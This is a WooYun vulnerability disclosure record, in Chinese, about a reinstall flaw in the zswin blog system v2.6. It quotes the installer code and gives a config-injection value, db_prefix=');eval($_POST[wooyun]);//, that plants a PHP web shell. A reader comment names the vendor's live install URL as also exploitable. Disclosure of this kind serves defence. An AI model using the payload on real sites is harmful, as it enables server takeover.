{"id": 29540, "wybug_id": "wooyun-2015-0119025", "wybug_title": "zswin博客系统v2.6存在重装漏洞", "wybug_corp": "zswin", "wybug_author": "路人甲", "wybug_date": "2015-06-10 10:54", "wybug_open_date": "2015-07-25 10:56", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： zswin博客系统存在重装漏洞，可直接getshell跟此系统是同一个系统：http://www.wooyun.org/bugs/wooyun-2010-0101083 详细说明：  漏洞文件:install/install/controller/indexcontroller.class.php    public function index(){    if (is_file('./Data/install.lock')) {\theader('Location: ./index.php');\texit;}虽然index方法是有判断系统是否安装也用了exit结束，但是这个不是类的初始化函数所以不影响其他方法的使用，下面有一个setconf方法,这个方法会把用户提交过来的数据（数据库连接配置）保存起来，在之后的finish_done方法中有一处write_config函数：我们来看看write_config函数：function write_config($config, $auth){\tif(is_array($config)){\t\t//读取配置内容\t\t$conf = file_get_contents(MODULE_PATH . 'sqldata/conf.tpl');\t\t$user = file_get_contents(MODULE_PATH . 'sqldata/user.tpl');\t\t//替换配置项\t\tforeach ($config as $name => $value) {\t\t\t$conf = str_replace(\"[{$name}]\", $value, $conf);\t\t\t$user = str_replace(\"[{$name}]\", $value, $user);\t\t}\t\t//写入应用配置文件        file_put_contents('./App/Common/Conf/config.php', $conf);        file_put_contents('./App/User/Conf/config.php', $user);\t\treturn ''; \t}}直接写进配置文件。/App/User/Conf/config.php这个配置文件比较简单所以就用这个把：<?php/** * UCenter客户端配置文件 * 注意：该配置文件请使用常量方式定义 */define('UC_APP_ID', 1); //应用IDdefine('UC_API_TYPE', 'Model'); //可选值 Model / Servicedefine('UC_AUTH_KEY', '+%N)Oo,F;89z=0b\"dX<JQk:!?]gLpr2Vjn/{6R~c'); //加密KEYdefine('UC_DB_DSN', 'mysql://root:root@127.0.0.1:3306/zswin'); // 数据库连接，使用Model方式调用API必须配置此项define('UC_TABLE_PREFIX', 'zs_'); // 数据表前缀，使用Model方式调用API必须配置此项根据配置文件我们可以提交：db_prefix=');eval($_POST[wooyun]);//之后就可以getshell了   漏洞证明：  \n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2015-06-10 13:32 |    \t\twormfox \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | wormfox)\t\t \n  官网也存在这个问题：http://zswin.kssoulmate.com/install.php?m=install&c=index&a=setconf利用方法就是本地搭建一个mysql服务器并开放外联，安装时使用本地发mysql进行连接，然后写配置文件插马就可以getshell了！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}